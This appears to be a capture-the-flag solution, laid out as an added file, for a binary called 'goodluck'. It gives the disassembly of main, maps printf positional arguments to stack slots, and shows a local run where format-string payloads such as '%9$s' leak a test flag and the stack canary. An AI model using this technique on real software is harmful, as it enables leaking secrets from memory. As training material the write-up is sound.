@@ -1,0 +1,129 @@
+goodluck, sha256 66daf236ffea0308652cb08ae3c59ca52f2c55bb775c0200e1d8614992ad4e26
+ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=81593855a5562e175ec76c6d4f3a88cf2e85ebbb, not stripped
+
+== string literals referenced by main ==
+0x400988  'r'
+0x40098a  'flag.txt'
+0x400993  "what's the flag"
+0x4009a3  '%ms'
+0x4009a7  'You answered:'
+0x4009b8  '\nBut that was totally wrong lol get rekt'
+0x4009e1  "That's right, the flag is %s\n"
+
+== objdump -d -M intel main ==
+00000000004007a6 <main>:
+  4007a6:	push   rbp
+  4007a7:	mov    rbp,rsp
+  4007aa:	sub    rsp,0x40
+  4007ae:	mov    rax,QWORD PTR fs:0x28
+  4007b7:	mov    QWORD PTR [rbp-0x8],rax
+  4007bb:	xor    eax,eax
+  4007bd:	mov    esi,0x400988
+  4007c2:	mov    edi,0x40098a
+  4007c7:	call   400680 <fopen@plt>
+  4007cc:	mov    QWORD PTR [rbp-0x30],rax
+  4007d0:	mov    DWORD PTR [rbp-0x3c],0x0
+  4007d7:	jmp    4007f4 <main+0x4e>
+  4007d9:	mov    rax,QWORD PTR [rbp-0x30]
+  4007dd:	mov    rdi,rax
+  4007e0:	call   400670 <_IO_getc@plt>
+  4007e5:	mov    edx,eax
+  4007e7:	mov    eax,DWORD PTR [rbp-0x3c]
+  4007ea:	cdqe
+  4007ec:	mov    BYTE PTR [rbp+rax*1-0x20],dl
+  4007f0:	add    DWORD PTR [rbp-0x3c],0x1
+  4007f4:	cmp    DWORD PTR [rbp-0x3c],0x15
+  4007f8:	jle    4007d9 <main+0x33>
+  4007fa:	mov    rax,QWORD PTR [rbp-0x30]
+  4007fe:	mov    rdi,rax
+  400801:	call   400620 <fclose@plt>
+  400806:	lea    rax,[rbp-0x20]
+  40080a:	mov    QWORD PTR [rbp-0x28],rax
+  40080e:	mov    edi,0x400993
+  400813:	call   400610 <puts@plt>
+  400818:	mov    rax,QWORD PTR [rip+0x200851]        # 601070 <stdout@GLIBC_2.2.5>
+  40081f:	mov    rdi,rax
+  400822:	call   400660 <fflush@plt>
+  400827:	mov    QWORD PTR [rbp-0x38],0x0
+  40082f:	lea    rax,[rbp-0x38]
+  400833:	mov    rsi,rax
+  400836:	mov    edi,0x4009a3
+  40083b:	mov    eax,0x0
+  400840:	call   400690 <__isoc99_scanf@plt>
+  400845:	mov    DWORD PTR [rbp-0x3c],0x0
+  40084c:	jmp    4008b4 <main+0x10e>
+  40084e:	mov    rdx,QWORD PTR [rbp-0x38]
+  400852:	mov    eax,DWORD PTR [rbp-0x3c]
+  400855:	cdqe
+  400857:	add    rax,rdx
+  40085a:	movzx  eax,BYTE PTR [rax]
+  40085d:	mov    BYTE PTR [rbp-0x3d],al
+  400860:	cmp    BYTE PTR [rbp-0x3d],0x0
+  400864:	je     400875 <main+0xcf>
+  400866:	mov    eax,DWORD PTR [rbp-0x3c]
+  400869:	cdqe
+  40086b:	movzx  eax,BYTE PTR [rbp+rax*1-0x20]
+  400870:	cmp    al,BYTE PTR [rbp-0x3d]
+  400873:	je     4008b0 <main+0x10a>
+  400875:	mov    edi,0x4009a7
+  40087a:	call   400610 <puts@plt>
+  40087f:	mov    rax,QWORD PTR [rbp-0x38]
+  400883:	mov    rdi,rax
+  400886:	mov    eax,0x0
+  40088b:	call   400640 <printf@plt>
+  400890:	mov    edi,0x4009b8
+  400895:	call   400610 <puts@plt>
+  40089a:	mov    rax,QWORD PTR [rip+0x2007cf]        # 601070 <stdout@GLIBC_2.2.5>
+  4008a1:	mov    rdi,rax
+  4008a4:	call   400660 <fflush@plt>
+  4008a9:	mov    eax,0x0
+  4008ae:	jmp    4008e4 <main+0x13e>
+  4008b0:	add    DWORD PTR [rbp-0x3c],0x1
+  4008b4:	cmp    DWORD PTR [rbp-0x3c],0x15
+  4008b8:	jle    40084e <main+0xa8>
+  4008ba:	mov    rax,QWORD PTR [rbp-0x28]
+  4008be:	mov    rsi,rax
+  4008c1:	mov    edi,0x4009e1
+  4008c6:	mov    eax,0x0
+  4008cb:	call   400640 <printf@plt>
+  4008d0:	mov    rax,QWORD PTR [rip+0x200799]        # 601070 <stdout@GLIBC_2.2.5>
+  4008d7:	mov    rdi,rax
+  4008da:	call   400660 <fflush@plt>
+  4008df:	mov    eax,0x0
+  4008e4:	mov    rcx,QWORD PTR [rbp-0x8]
+  4008e8:	xor    rcx,QWORD PTR fs:0x28
+  4008f1:	je     4008f8 <main+0x152>
+  4008f3:	call   400630 <__stack_chk_fail@plt>
+  4008f8:	leave
+  4008f9:	ret
+  4008fa:	nop    WORD PTR [rax+rax*1+0x0]
+
+== printf varargs at the call site ==
+main does `sub rsp,0x40`, so rsp = rbp-0x40 when printf(user) is called with
+rdi = user and al = 0. Under SysV the first five conversion arguments come from
+rsi, rdx, rcx, r8 and r9, so %6$ is the first stack qword.
+
+  %6$   [rsp+0x00]  rbp-0x40   padding
+  %7$   [rsp+0x08]  rbp-0x38   char *user, the scanf("%ms") allocation
+  %8$   [rsp+0x10]  rbp-0x30   FILE *fp
+  %9$   [rsp+0x18]  rbp-0x28   char *p = buf, stored by lea rax,[rbp-0x20]
+  %10$  [rsp+0x20]  rbp-0x20   flag bytes 0..7
+  %11$  [rsp+0x28]  rbp-0x18   flag bytes 8..15
+  %12$  [rsp+0x30]  rbp-0x10   flag bytes 16..21
+  %13$  [rsp+0x38]  rbp-0x08   stack canary
+
+== local run, flag.txt holding flag{always_give_110%} ==
+local flag.txt holds 22 bytes, which is what the read loop consumes
+--- %9$s ---
+what's the flag
+You answered:
+flag{always_give_110%}
+But that was totally wrong lol get rekt
+--- inline qwords ---
+what's the flag
+You answered:
+776c617b67616c66.657669675f737961.7d253031315f.e5dd971def668000
+But that was totally wrong lol get rekt
+reassembled 'flag{always_give_110%}'
+arg 13 is e5dd971def668000, low byte 0x00
+flag flag{always_give_110%}
